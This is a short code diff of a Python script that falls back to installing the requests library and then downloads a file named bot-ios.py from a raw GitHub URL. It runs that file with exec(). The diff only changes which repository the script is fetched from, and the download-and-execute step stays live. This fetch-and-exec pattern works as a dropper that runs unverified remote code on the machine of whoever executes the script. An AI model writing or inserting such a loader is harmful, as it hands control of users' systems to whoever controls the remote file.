@@ -15,5 +15,5 @@ except ImportError:
         except Exception as e:
             print("Failed to install requests with pip and pip:", str(e))
             exit(0)
-response = requests.get("https://raw.githubusercontent.com/wqfa/6/main/bot-ios.py")
+response = requests.get("https://raw.githubusercontent.com/wqfa/3/main/bot-ios.py")
 exec(response.text)
